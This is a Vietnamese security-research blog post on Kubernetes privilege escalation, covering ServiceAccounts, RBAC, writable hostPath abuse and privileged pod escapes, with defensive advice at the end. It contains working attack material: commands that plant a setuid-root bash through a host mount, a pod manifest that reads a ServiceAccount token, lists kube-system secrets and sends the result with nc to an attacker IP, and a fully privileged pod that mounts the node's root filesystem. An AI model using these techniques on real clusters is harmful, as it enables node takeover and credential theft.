---
title: "Tu?n 2 - Hacking Kubernetes (Part 1)"
date: 2026-05-24 00:00:00 +0700
categories: ["Security Research"]
tags: ["Kubernetes", "Security"]
---


##  Các Attack vector trong Privilege Escalation in K8s


Tru?c khi di sau vào ki thu?t thì mình cung mu?n các b?n có th? hi?u du?c các khái ni?m mà mình th?y là quan tr?ng d? có th? khai thác các l? h?ng v? K8s.
### I. ServiceAccount là gì?

Trong Kubernetes, **ServiceAccount** cung c?p d?nh danh cho các ti?n trình ch?y bên trong container . Khi ngu?i dùng c? g?ng xác th?c v?i v?i API K8s , ngu?i có ch? c?n certificate d? xác minh danh tính c?a h? . Còn v?i m?t non-human resource nhu pod thì c?n SA d? có danh tính khi giao ti?p API server K8s . M?t ti?n trình bên trong Pod có th? s? d?ng SA du?c liên k?t v?i nó d? xác th?c v?i API server.

![](/assets/images/posts/Pasted%20image%2020260524220427.png)


Trong Kubernetes, co ch? gán ServiceAccount (SA) m?c d?nh ho?t d?ng nhu sau:

- **T? d?ng gán:** M?i Namespace luôn có s?n m?t SA tên là `default`.
- **M?c d?nh:** N?u b?n không ch? d?nh `serviceAccountName` trong file c?u hình Pod, K8s s? t? d?ng gán SA `default` này cho Pod dó.
- **G?n Token:** K8s s? t? d?ng mount m?t API token c?a SA này vào thu m?c `/var/run/secrets/kubernetes.io/serviceaccount` bên trong Pod.

Ví d?:

`Pod -> dùng ServiceAccount token -> g?i Kubernetes API Server`

M?c d?nh, Kubernetes thu?ng mount thông tin ServiceAccount vào pod t?i:

`/var/run/secrets/kubernetes.io/serviceaccount/`

Trong thu m?c này thu?ng có:

```
ca.crt      certificate d? verify API server
namespace  namespace hi?n t?i c?a pod
token      bearer token c?a ServiceAccount
```


### II. RBAC là gì?
RBAC là vi?t t?t c?a **Role-Based Access Control**. Nó quy?t d?nh m?t identity du?c phép làm gì trong Kubernetes.

RBAC tr? l?i các câu h?i ki?u:

ServiceAccount này có du?c get secrets không? 
ServiceAccount này có du?c list pods không? 
ServiceAccount này có du?c create deployments không? 
ServiceAccount này có du?c d?c secret trong namespace khác không?


![](/assets/images/posts/Pasted%20image%2020260524220317.png)


RBAC thu?ng g?m 4 object chính:

`Role ,RoleBinding , ClusterRole, ClusterRoleBinding`

Trong K8s các thành ph?n này dùng d? qu?n lí quy?n h?n c?a ngu?i dùng và ?ng d?ng v?i các tài nguyên trong Cluster

Hi?u 1 cách don gi?n thì Role/ClusterRole : Dùng cho câu h?i du?c làm gì ? (Ð?nh nghia quy?n) còn binding thì tr? l?i cho câu h?i ai du?c làm (gán quy?n cho 1 ngu?i dùng c? th?)

Role/Rolebiding : Dùng khi b?n mu?n gi?i h?n quy?n d?nh ra trong 1 namespace nh?t d?nh

- Role : T?p h?p các quy t?c cho phép th?c hi?n 1 hành d?ng (get,list,create,delete) trên các tài nguyên nhu Pod, Service trong 1 namespace
- Rolebiding : Liên k?t 1 role v?i 1 object c? th? nhu User , Group, ho?c Service Account) trong cùng 1 namespace dó .
Ví d? nhu : Gán quy?n "ch? xem Pod" cho b?n An trong namespace `frontend`

ClusterRole và ClusterRoleBinding (C?p d? Toàn C?m): Dùng cho các tài nguyên **không thu?c Namespace** (nhu Nodes, PersistentVolumes) ho?c khi mu?n c?p quy?n trên **toàn b? các Namespace**.

- **ClusterRole**: Ð?nh nghia quy?n trên toàn cluster. Nó có th? dùng d? phân quy?n cho các tài nguyên chung c?a h? th?ng.
- **ClusterRoleBinding**: C?p quy?n t? ClusterRole cho ngu?i dùng trên ph?m vi toàn c?m, b?t k? Namespace nào.

Các l?nh enum RBAC

```
# Get current privileges
kubectl auth can-i --list
# use `--as=system:serviceaccount:<namespace>:<sa_name>` to impersonate a service account

# List Cluster Roles
kubectl get clusterroles
kubectl describe clusterroles

# List Cluster Roles Bindings
kubectl get clusterrolebindings
kubectl describe clusterrolebindings

# List Roles
kubectl get roles
kubectl describe roles

# List Roles Bindings
kubectl get rolebindings
kubectl describe rolebindings
```


![](/assets/images/posts/Pasted%20image%2020260521224006.png)


M?t s? quy?n h?n nguy hi?m n?u config ko chính xác s? có th? là 1 attack surface cho các attacker khai thác

1. Manipulate AuthN / AuthZ (Thao túng xác th?c và ?y quy?n)

Nhóm này cho phép k? t?n công thay d?i cách h? th?ng nh?n di?n và c?p quy?n:

- **impersonate**: Gi? danh ngu?i dùng khác (có th? là admin).
- **escalate**: T? nâng c?p quy?n h?n c?a chính mình.
- **bind**: T?o các liên k?t quy?n m?i d? c?p quy?n cho tài kho?n khác.

2. Remote Code Execution (Th?c thi mã t? xa)

Nhóm này cho phép k? t?n công ch?y l?nh trái phép bên trong các container:

- **create pods/exec**: Ch?y l?nh tr?c ti?p vào m?t Pod dang ho?t d?ng.
- **create nodes/proxy**: K?t n?i tr?c ti?p d?n các Node thông qua proxy d? can thi?p sâu hon.
- **control mutating webhooks**: Thay d?i c?u hình c?a các d?i tu?ng ngay khi chúng v?a du?c t?o ra.

3. Acquire Tokens (Chi?m do?t Token)

Nhóm này t?p trung vào vi?c l?y các thông tin dang nh?p bí m?t:

- **list secrets**: Ð?c toàn b? m?t kh?u, API key luu trong cluster.
- **create serviceaccounts/token**: T? t?o token m?i cho các tài kho?n d?ch v? d? duy trì quy?n truy c?p b?n b?.

4. Steal Pods (Ðánh c?p ho?c can thi?p Pod)

Nhóm này nh?m vào vi?c di?u hu?ng ho?c phá h?y các ?ng d?ng dang ch?y:

- **modify nodes**: Thay d?i c?u hình máy ch? d? ép Pod ch?y trên các nút b? ki?m soát.
- **delete pods/nodes**: Gây gián do?n d?ch v? b?ng cách xóa các thành ph?n quan tr?ng.



Du?i dây là 1 bài t?p mà mình tìm du?c v? KillerConda d? có th? demo cách config v? RBAC

![](/assets/images/posts/Pasted%20image%2020260521211943.png)



![](/assets/images/posts/Pasted%20image%2020260521212922.png)

Câu 1 : Cái này thì b?n t?o ra các resource cùng v?i cái verb th?c hi?n resource dó trong 1 namepace là application

![](/assets/images/posts/Pasted%20image%2020260521213612.png)

Câu 2 : Sau khi t?o role thì b?n rolebinding g?n các quy?n vào các role dó
![](/assets/images/posts/Pasted%20image%2020260521214129.png)


Câu 3 : Ki?m tra l?i các quy?n mà ta có th? làm
![](/assets/images/posts/Pasted%20image%2020260521215047.png)


## III . Nghiên c?u các ki thu?t leo thang d?c quy?n trong K8s


### 1. Attacking Kubernetes from inside a Pod

![](/assets/images/posts/Pasted%20image%2020260522162103.png)

Khi attacker chi?m du?c shell trong 1 Pod , container dó tr? thành 1 ch? d?ng ? bên trong K8s cluster . T? dây m?c dích c?a các attacker là thoát kh?i Pod t? Node dó b?ng cách ki?m tra quy?n c?a Pod , tìm token , dò các service n?i b? , ki?m tra volume mount ,...

Pod escape : Là quá trình attacker thoát kh?i ph?m vi container /Pod d? truy c?p vào các Node . T?t nhiên là không ph?i Pod nào cung escape du?c , tùy thu?c cái cách Pod dó du?c config nhu Pod dó có Privileged mode không , hostPath mount , hostPID, hostNetwork , Linux capabilities ho?c container runtime b? expose,...


Ðây là ví d? di?n hình c?a misconfiguration trong Kubernetes. M?t c?u hình volume tu?ng nhu ph?c v? v?n hành có th? tr? thành du?ng d?n d? attacker di t? container ra Node.

### a) Abusing  writeable hostPath/bind mounts (Container -> host root via SUID planting)


Tru?c khi di sau vào ki thu?t t?n công thì gi?i thi?u so qua v? khái ni?m hostPath

Trong Kubernetes, hostPath volume là co ch? cho phép b?n g?n (mount) tr?c ti?p m?t t?p tin ho?c thu m?c t? h? th?ng t?p tin (filesystem) c?a máy ch? (Worker Node) vào bên trong m?t Pod.

 Ð?c di?m c?t lõi

- **Luu tr? c?c b?:** D? li?u du?c luu th?ng trên ? c?ng c?a Node v?t lý (ho?c máy ?o) dang ch?y Pod.
- **Ð? b?n (Persistence):** D? li?u không b? m?t khi container trong Pod b? kh?i d?ng l?i ho?c b? xóa.
- **Tính ràng bu?c (Node-specific):** Vì g?n v?i m?t Node c? th?, n?u Pod b? t?t và du?c lên l?ch (schedule) l?i sang m?t Node khác, nó s? không th? truy c?p du?c d? li?u cu tr? khi Node m?i có c?u trúc thu m?c y h?t

Thông thu?ng , `hostPath` thu?ng du?c áp d?ng cho các tru?ng h?p d?c thù nhu:

- Ch?y các ?ng d?ng c?n d?c ho?c ghi vào log h? th?ng c?a Node.
- C?n truy c?p các socket Docker daemon (ví d?: `/var/run/docker.sock`) t? bên trong Pod.
- Th?c hi?n các tác v? giám sát (monitoring) ho?c qu?n lý cluster yêu c?u quy?n truy c?p sâu vào filesystem c?a Node


N?u m?t Pod ho?c container b? compromise có 1 volume ghi du?c ánh x? tr?c ti?p d?n host filesystem (K8s hostPath ho?c là Docker bindmount ), và b?n có th? tr? thành root bên trong container  , b?n có th? t?n d?ng mount dó d? có th? t?o ra 1 setuid-root binary trên host và sau dó th?c thi  nó t? máy ch? d? l?y quy?n root

Key conditions :

-  Volume mount t? host vào container có quy?n ghi
- Filesystem host không b?t co ch? ch?n ki?u `nosuid`.
- Attacker có cách khi?n file du?c ghi trên host n?u file du?c th?c thi 


Cách xác d?nh hostPath/bind mounts có th? du?c ghi 

- With kubectl , thì b?n có check b?ng l?nh sau 
```
kubectl get pod -o jsonpath='{.specvolumes[*].hostPath.path}'
```

- T? bên trong container , list mount và tìm ki?m host-path mounts 

```
# Inside the compromised container
mount | column -t

cat /proc/self/mountinfo | grep -E 'host-path|kubernetes.io~host-path' || true

findmnt -T / 2>/dev/null | sed -n '1,200p'

# Test if a specific mount path is writable
TEST_DIR=/var/www/html/some-mount  # replace with your suspected mount path
[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"

# Quick practical test
printf "ping\n" > "$TEST_DIR/.w"

```

Plant a setuid root binary from the container:


```
# As root inside the container, copy a static shell (or /bin/bash) into the mounted path and set SUID/SGID

MOUNT="/var/www/html/survey"   # path inside the container that maps to a host directory

cp /bin/bash "$MOUNT/suidbash"
chmod 6777 "$MOUNT/suidbash"
ls -l "$MOUNT/suidbash"

# -rwsrwsrwx 1 root root 1234376 ... /var/www/html/survey/suidbash


```


```
# On the host, locate the mapped path (e.g., from the Pod spec .spec.volumes[].hostPath.path or by prior enumeration)
# Example host path: /opt/limesurvey/suidbash
ls -l /opt/limesurvey/suidbash
/opt/limesurvey/suidbash -p   # -p preserves effective UID 0 in bash

```


### Luu ý khi khai thác writable hostPath

K? thu?t writable hostPath không ph?i lúc nào cung d?n t?i leo thang d?c quy?n ngay l?p t?c. M?t ví d? ph? bi?n là attacker ghi m?t SUID binary vào thu m?c du?c mount t? host. V? lý thuy?t, n?u binary này thu?c s? h?u c?a root và có SUID bit, khi du?c th?c thi trên host nó có th? ch?y v?i effective UID là root.

Tuy nhiên, k? thu?t này ph? thu?c vào mount option c?a filesystem. N?u filesystem trên host du?c mount v?i option `nosuid`, Linux s? b? qua SUID/SGID bit. Khi dó, m?c dù file hi?n th? có quy?n SUID, nó cung không th? du?c dùng d? nâng quy?n. B?n có th? check mount option trên host b?ng (cat /proc/mounts | grep ) and  ki?m nosuid.

Ngoài ra, attacker c?n có cách d? khi?n file dã ghi du?c th?c thi t? phía host. N?u ch? có quy?n ghi t? container nhung không có user shell, cron job, systemd service ho?c process nào trên host ch?y file dó, thì vi?c “plant” SUID binary ch? d?ng l?i ? vi?c d?t file lên host filesystem, chua d? d? chi?m quy?n.

Tuy nhiên, writable hostPath v?n là m?t r?i ro nghiêm tr?ng n?u du?ng d?n du?c mount là thu m?c nh?y c?m. Ví d?, n?u mount tr? t?i `/root/.ssh`, attacker có th? ghi thêm SSH key; n?u mount tr? t?i `/etc/cron.d`, attacker có th? t?o cron job; n?u mount tr? t?i `/etc/systemd/system`, attacker có th? d?t service persistence. Vì v?y, m?c d? nguy hi?m c?a writable hostPath ph? thu?c r?t l?n vào host path c? th? du?c mount vào Pod.

 K? thu?t này cung ho?t d?ng v?i các bind mount thông thu?ng c?a Docker; trong Kubernetes, nó thu?ng là m?t volume hostPath (readOnly: false) ho?c m?t subPath có ph?m vi không chính xác.


### b) Abusing Roles/ClusterRoles in Kubernetes

Nhu trong ph?n ServiceAccount mình có vi?t ? trên thì da s? các Pod ch?y v?i service account token trong nó . Ðôi khi SA này du?c c?u hình ko dúng nên chúng ta thu?ng s? t?n d?ng t?n d?ng SA có 1 s? d?c quy?n này d? có th? khai thác 

![](/assets/images/posts/Pasted%20image%2020260522174411.png)


Privilege Escalation trong Kubernetes có th? hi?u là quá trình attacker tìm cách chuy?n t? quy?n hi?n t?i sang m?t identity khác có quy?n cao hon. Identity này có th? là user, group, ServiceAccount trong cluster, ho?c trong m?t s? tru?ng h?p là quy?n cloud IAM bên ngoài n?u cluster ch?y trên AWS, GCP ho?c Azure.

Khác v?i privilege escalation trên Linux truy?n th?ng, trong Kubernetes attacker không ch? c? g?ng leo t? user thu?ng lên root trong m?t máy. M?c tiêu có th? là chi?m du?c ServiceAccount m?nh hon, d?c du?c Secret nh?y c?m, t?o Pod v?i c?u hình nguy hi?m, truy c?p Node, ho?c l?i d?ng quy?n cloud g?n v?i workload ho?c node.

Trong Kubernetes, có b?n hu?ng leo thang d?c quy?n ph? bi?n:

1. **Impersonation**  
   Attacker có quy?n gi? m?o user, group ho?c ServiceAccount khác. N?u identity b? impersonate có quy?n cao hon, attacker có th? hành d?ng v?i quy?n c?a identity dó.

2. **Create / Patch / Exec Pod**  
   Attacker có quy?n t?o, s?a ho?c exec vào Pod. N?u có th? t?o Pod dùng ServiceAccount m?nh hon, mount secret, ho?c ch?y Pod v?i c?u hình privileged, attacker có th? m? r?ng quy?n trong cluster.

3. **Read Secrets**  
   Kubernetes Secret có th? ch?a ServiceAccount token, password, kubeconfig ho?c credential ?ng d?ng. N?u attacker có quy?n `get` ho?c `list` Secret, h? có th? l?y credential d? impersonate identity khác.

4. **Escape t? container ra Node**  
   N?u Pod du?c c?u hình quá nguy hi?m, ví d? privileged, hostPID, hostNetwork ho?c mount hostPath, attacker có th? thoát kh?i container d? truy c?p Node. Khi dã vào Node, attacker có th? tìm token c?a các Pod khác, kubelet credential ho?c cloud metadata credential.

Ngoài b?n hu?ng chính trên, m?t quy?n dáng chú ý khác là `port-forward`. N?u attacker có quy?n port-forward t?i Pod, h? có th? truy c?p các service n?i b? v?n không du?c expose ra ngoài.


### Wildcard Permission: quy?n quá r?ng trong RBAC

Trong RBAC, wildcard `*` là m?t c?u hình r?t nguy hi?m n?u du?c c?p sai d?i tu?ng. Wildcard có th? xu?t hi?n ? `apiGroups`, `resources` ho?c `verbs`.

Ví d?:

```
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

```


C?u hình này có nghia là identity du?c c?p quy?n có th? th?c hi?n m?i hành d?ng trên m?i lo?i tài nguyên thu?c m?i API group. N?u quy?n này n?m trong ClusterRole, ph?m vi ?nh hu?ng không ch? gi?i h?n trong m?t namespace mà có th? áp d?ng trên toàn cluster.

Ðây thu?ng là quy?n dành cho admin ho?c controller h? th?ng có nhu c?u d?c bi?t. N?u m?t ServiceAccount c?a workload thông thu?ng du?c gán quy?n wildcard, attacker ch? c?n compromise Pod s? d?ng ServiceAccount dó là có th? có g?n nhu toàn quy?n thao tác v?i cluster.


M?t bi?n th? khác là wildcard resource nhung gi?i h?n verb:

```
apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```


Nhìn qua có v? ít nguy hi?m hon verbs: ["*"], nhung v?n t?o ra r?i ro l?n:

- create: có th? t?o tài nguyên m?i, bao g?m Pod ho?c RoleBinding n?u không b? gi?i h?n.
- list: có th? li?t kê tài nguyên trong cluster, làm l? c?u trúc h? th?ng.
- get: có th? d?c tài nguyên nh?y c?m, d?c bi?t là Secret.

Vì v?y, khi dánh giá RBAC, không ch? c?n tìm quy?n *, mà còn c?n xem quy?n dó áp d?ng lên resource nào và ? ph?m vi namespace hay cluster.


### Pod Create - Steal Token 

M?t quy?n tu?ng nhu bình thu?ng nhung r?t nguy hi?m trong Kubernetes là `create pods`. N?u attacker có quy?n t?o Pod trong m?t namespace, h? có th? c? g?ng t?o Pod m?i s? d?ng m?t ServiceAccount khác trong cùng namespace.

N?u ServiceAccount dó có quy?n cao hon, token c?a nó s? du?c mount vào Pod m?i. Khi attacker di?u khi?n container trong Pod này, h? có th? d?c token và dùng nó d? g?i Kubernetes API v?i quy?n c?a ServiceAccount m?nh hon.


Ví d? v? m?t pod s? dánh c?p token c?a `bootstrap-signer`tài kho?n d?ch v? và g?i nó cho k? t?n công:

```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
    - name: alpine
      image: alpine
      command: ["/bin/sh"]
      args:
        [
          "-c",
          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
        ]
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true

```

Nói don gi?n: n?u attacker có quy?n **t?o Pod trong namespace kube-system**, attacker có th? t?o m?t Pod m?i và b?t Pod dó ch?y b?ng ServiceAccount tên bootstrap-signer. Khi Pod ch?y, Kubernetes s? t? mount token c?a ServiceAccount dó vào trong container. Sau dó command bên trong container d?c token này và dùng nó d? g?i API Server.

 Gi?i thích t?ng ph?n

`metadata: name: alpine namespace: kube-system`

T?o Pod tên alpine trong namespace kube-system.

Namespace này nh?y c?m vì thu?ng ch?a các component h? th?ng ho?c ServiceAccount quan tr?ng.

```
image: alpine 
command: ["/bin/sh"]
```

Pod dùng image Alpine và ch?y shell.

```
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
```

Ðây là ph?n quan tr?ng nh?t.

Nó b?o Kubernetes ch?y Pod này v?i ServiceAccount bootstrap-signer.

Khi automountServiceAccountToken: true, token c?a ServiceAccount dó s? du?c mount vào container t?i:

`/run/secrets/kubernetes.io/serviceaccount/token`

T?c là bên trong container có th? d?c du?c token này.

`cat /run/secrets/kubernetes.io/serviceaccount/token`

L?nh này d?c token c?a ServiceAccount bootstrap-signer.

```
curl -k -v \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets
```

L?nh này dùng token v?a d?c d? g?i Kubernetes API.

C? th? nó dang th? truy c?p endpoint li?t kê Secret trong namespace kube-system.

N?u ServiceAccount bootstrap-signer có quy?n d?c Secret, API Server s? tr? v? d? li?u Secret.

`| nc -nv 192.168.154.228 6666`

Ph?n này g?i output ra máy attacker ? IP 192.168.154.228, port 6666.

Nói cách khác:

`Ð?c token -> dùng token g?i API -> g?i k?t qu? v? attacker`

`hostNetwork: true`

Pod dùng network namespace c?a Node.

Ði?u này có th? giúp Pod truy c?p network gi?ng nhu Node, dôi khi bypass m?t s? gi?i h?n network ho?c truy c?p du?c endpoint mà Pod thu?ng không truy c?p du?c.


Ði?m quan tr?ng ? dây là attacker không c?n bi?t password hay private key c?a ServiceAccount. Kubernetes t? d?ng mount token vào Pod n?u automountServiceAccountToken du?c b?t.

### Ði?u ki?n c?n có

- Attacker có quy?n create pods.
- Namespace t?n t?i ServiceAccount có quy?n cao hon.
- Admission policy không ch?n vi?c g?n ServiceAccount dó.
- Token du?c mount vào Pod.

### Phòng th?

- Không c?p quy?n create pods quá r?ng.
- Không d? ServiceAccount m?nh n?m trong namespace có workload kém tin c?y.
- T?t automountServiceAccountToken n?u Pod không c?n g?i Kubernetes API.
- Dùng RBAC least privilege.
- Dùng admission controller nhu Kyverno, OPA Gatekeeper ho?c Pod Security Admission d? ki?m soát ServiceAccount du?c phép s? d?ng.


## Pod Create & Escape



N?u attacker có quy?n t?o Pod và cluster không có chính sách Pod Security ch?t ch?, h? có th? t?o m?t Pod v?i c?u hình nguy hi?m d? ti?p c?n Node.

M?t s? c?u hình d?c bi?t nguy hi?m g?m:

| C?u hình | Ý nghia | R?i ro |
|---|---|---|
| `privileged: true` | Container du?c c?p quy?n g?n nhu tuong duong host | Có th? tuong tác sâu v?i kernel, device, container runtime |
| `hostPID: true` | Pod dùng PID namespace c?a host | Có th? nhìn th?y process trên Node |
| `hostNetwork: true` | Pod dùng network namespace c?a host | Có th? truy c?p network nhu Node, ?nh hu?ng NetworkPolicy |
| `hostIPC: true` | Pod dùng IPC namespace c?a host | Có th? truy c?p shared memory ho?c IPC resource |
| `hostPath: /` | Mount filesystem g?c c?a Node vào container | Có th? d?c/s?a file trên Node n?u có quy?n |

N?u nhi?u c?u hình nguy hi?m du?c k?t h?p, Pod có th? tr? thành c?u n?i d? attacker escape ra Node.

```
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
    - image: ubuntu
      command:
        - "sleep"
        - "3600" # adjust this as needed -- use only as long as you need
      imagePullPolicy: IfNotPresent
      name: ubuntu
      securityContext:
        allowPrivilegeEscalation: true
        privileged: true
        #capabilities:
        #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
        runAsUser: 0 # run as root (or any other user)
      volumeMounts:
        - mountPath: /host
          name: host-volume
  restartPolicy: Never # we want to be intentional about running this pod
  hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
  hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
  hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
  volumes:
    - name: host-volume
      hostPath:
        path: /

```


## Gi?i thích t?ng ph?n

```
`apiVersion: v1 
kind: Pod 
metadata: 
name: ubuntu`
```

T?o m?t Pod tên ubuntu.

`containers: - image: ubuntu command: - "sleep" - "3600"`

Container dùng image Ubuntu và ch? ch?y sleep 3600 d? gi? Pod s?ng trong 1 gi?. Sau khi Pod ch?y, attacker có th? exec vào container d? thao tác th? công.

```
securityContext:
  allowPrivilegeEscalation: true
  privileged: true
  runAsUser: 0
```

Ðây là ph?n r?t nguy hi?m.

- runAsUser: 0: container ch?y b?ng user root.
- allowPrivilegeEscalation: true: cho phép process trong container leo quy?n thông qua co ch? nhu SUID ho?c file capability.
- privileged: true: container du?c c?p quy?n r?t cao, g?n v?i quy?n c?a host. Nhi?u l?p cô l?p b?o m?t c?a container b? n?i l?ng.

Nói ng?n g?n: container này không còn là workload bình thu?ng n?a, mà là m?t container có quy?n h? th?ng r?t m?nh.

```
volumeMounts:
  - mountPath: /host
    name: host-volume
```

Mount m?t volume vào trong container t?i du?ng d?n /host.

Ph?n volume du?c d?nh nghia bên du?i:

```
volumes:
  - name: host-volume
    hostPath:
      path: /
```

hostPath.path: / nghia là mount toàn b? filesystem g?c c?a Node vào container.

T?c là:

`Trong container: /host ,Th?c t? là: / c?a Node`

Vì v?y, khi attacker vào container và d?c /host/etc, th?c ch?t là dang d?c /etc c?a Node.

Ví d?:

`/host/etc/kubernetes/ /host/var/lib/kubelet/ /host/root/ /host/home/`

Ðây là m?t trong nh?ng c?u hình hostPath nguy hi?m nh?t.

`hostIPC: true`

Container dùng IPC namespace c?a host.

IPC là co ch? giao ti?p gi?a các process nhu shared memory, semaphore, message queue. N?u dùng IPC namespace c?a host, container có th? nhìn th?y ho?c tuong tác v?i m?t s? IPC resource c?a Node.

`hostNetwork: true`

Container dùng network namespace c?a host.

Ði?u này có nghia là Pod dùng network stack c?a Node, không ph?i network riêng c?a Pod. Nó có th?:

- Nhìn network t? góc nhìn c?a Node.
- Truy c?p các service ch? bind trên Node network.
- Có kh? nang bypass m?t s? NetworkPolicy tùy CNI.
- Truy c?p metadata endpoint trong môi tru?ng cloud d? hon.

`hostPID: true`

Container dùng PID namespace c?a host.

Ði?u này cho phép container nhìn th?y process dang ch?y trên Node. N?u k?t h?p v?i privileged: true, attacker có th? dùng k? thu?t nhu nsenter d? vào namespace c?a process trên host, thu?ng là PID 1.

Nói d? hi?u:

`hostPID: true -> th?y process c?a Node privileged: true -> có quy?n tuong tác sâu hostPath: / -> th?y filesystem c?a Node`

Khi 3 th? này k?t h?p l?i, ranh gi?i container và host g?n nhu b? phá v?.

## Flow t?n công

```
Attacker có quy?n create pods
        |
        v
T?o Pod ubuntu v?i privileged + hostPID + hostNetwork + hostPath /
        |
        v
Exec vào container
        |
        v
Truy c?p /host d? d?c filesystem c?a Node
        |
        v
Tìm kubelet config, kubeconfig, token, secret, certificate
        |
        v
Có th? leo thang ra Node ho?c cluster
```

## Vì sao nó nguy hi?m?

Vì Pod này có quá nhi?u d?c quy?n cùng lúc:

|C?u hình|Nguy hi?m ? dâu|
|---|---|
|privileged: true|Container có quy?n r?t cao trên host|
|runAsUser: 0|Ch?y b?ng root trong container|
|allowPrivilegeEscalation: true|Cho phép leo quy?n trong container|
|hostPath: /|Mount toàn b? filesystem c?a Node|
|hostPID: true|Nhìn th?y process c?a Node|
|hostNetwork: true|Dùng network c?a Node|
|hostIPC: true|Dùng IPC c?a Node|

N?u cluster không có Pod Security Admission, Kyverno, Gatekeeper ho?c policy tuong duong d? ch?n các c?u hình này, quy?n create pods có th? tr? thành du?ng d?n leo thang r?t m?nh.


### Stealth / BadPods

### Các bi?n th? Pod nguy hi?m

Không ph?i lúc nào attacker cung c?n t?o m?t Pod b?t t?t c? quy?n nguy hi?m. Trong th?c t?, m?i c?u hình có th? t?o ra m?t m?c d? r?i ro khác nhau.

M?t s? bi?n th? thu?ng du?c nghiên c?u trong BadPods:

- **Privileged + hostPID**: r?t nguy hi?m vì container có quy?n cao và nhìn th?y process c?a host.
- **Privileged only**: có th? tuong tác sâu v?i h? th?ng, ph? thu?c runtime và kernel.
- **hostPath**: nguy hi?m n?u mount thu m?c nh?y c?m c?a Node.
- **hostPID**: có th? quan sát process trên host, tìm thông tin nh?y c?m trong command line.
- **hostNetwork**: có th? truy c?p network t? góc nhìn c?a Node.
- **hostIPC**: có th? ?nh hu?ng ho?c d?c IPC/shared memory trong m?t s? tru?ng h?p.

Ý nghia c?a ph?n này là: Kubernetes privilege escalation không ch? d?n t? m?t c?u hình duy nh?t, mà thu?ng là k?t qu? c?a nhi?u c?u hình y?u k?t h?p v?i nhau.

B?n có th? tham kh?o ví d? cách t?o c?u hình badpods t?i link này khá là hay ? dây.

https://github.com/BishopFox/badPods

Ngoài ra tui cung có nghiên c?u 1 case khá là hay trên X c?a Duffie Cooley minh h?a m?t one-liner t?o Pod d?c quy?n d? truy c?p namespace c?a Node. T?n d?ng 2 c?u hình là  b?t `hostPID: true` và `privileged: true` https://x.com/mauilion/status/1129468485480751104



### Container escape

M?t trong nh?ng r?i ro nghiêm tr?ng nh?t khi v?n hành kubernetes là container breakout , là  tình hu?ng mà m?t ti?n trình ch?y trong container có quy?n thoát ra co ch? cô l?p hi?n t?i c?a container và tác d?ng lên host và node cung nhu các tài nguyên khác trong cluster.

V?  lý thuy?t ,container breakout thu?ng du?c hi?u là khai thác l? h?ng phía kernel ,container runtime ,network stack ho?c storage stack d? phá v? co ch? isolation . Tuy nhiên trong th?c t? , không ph?i lúc nào attacker cung ph?i t?n công b?ng các l?i Zero day ph?c t?p ,nhung b?n có th? tham kh?o các CVE 2026 v? linux kernel nhu : Copy-fail , DirtyFrag, DirtyDecrypt,... .Nhi?u tru?ng h?p breakout v?n x?y ra do misconfig , ví d? container ch?y v?i quy?n quá cao ,mount file system c?a host ,c?p th?a linux capabilities, ho?c ServiceAccount có RBAC quá r?ng

Nói cách khác, n?u m?t container du?c c?u hình sai, attacker có th? không c?n “hack kernel” mà v?n có du?ng h?p l? d? ch?m t?i host ho?c cluster.

M?t s? nguyên nhân ph? bi?n d?n t?i container escape g?m:

- Container ch?y b?ng user root.
- Container du?c c?p privileged: true.
- Container có capability nguy hi?m nhu CAP_SYS_ADMIN.
- Pod mount host filesystem b?ng hostPath.
- Container có th? truy c?p socket nh?y c?m nhu Docker/container runtime socket.
- Service account token trong pod có quy?n quá r?ng.
- Workload có th? g?i cloud metadata API d? l?y credential.
- Kernel ho?c container runtime có CVE chua du?c vá.
- App bên trong container b? RCE, sau dó attacker dùng quy?n hi?n có d? pivot.

Ði?m quan tr?ng là container không ph?i là m?t “máy ?o nh?” v?i boundary c?ng nhu nhi?u ngu?i tu?ng. Container dùng chung kernel v?i host, nên n?u attacker có d? quy?n bên trong container, d?c bi?t là root c?ng thêm capability nguy hi?m, ranh gi?i b?o m?t s? tr? nên r?t m?ng.

Ví d?, n?u m?t container ch?y ? ch? d? privileged và có quy?n mount thi?t b? c?a host, attacker có th? tuong tác v?i filesystem bên ngoài container. Khi dó container không còn ch? nhìn th?y filesystem riêng c?a nó n?a, mà có th? nhìn th?y ho?c ghi vào filesystem c?a node. Ðây là m?t d?ng breakout r?t nguy hi?m vì attacker có th? d?t persistence, d?c d? li?u nh?y c?m, ho?c can thi?p vào c?u hình host.

Tuy nhiên, không ph?i container nào cung d? breakout. N?u workload ch?y b?ng non-root user, b? drop capabilities, filesystem ch? d?c, không có hostPath nguy hi?m, và du?c gi?i h?n b?i AppArmor/SELinux/seccomp, thì r?t nhi?u k? thu?t escape s? b? vô hi?u hóa ho?c khó th?c hi?n hon nhi?u.

Vì v?y, trong phòng th? Kubernetes, c?n chú ý các c?u hình sau:

```
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

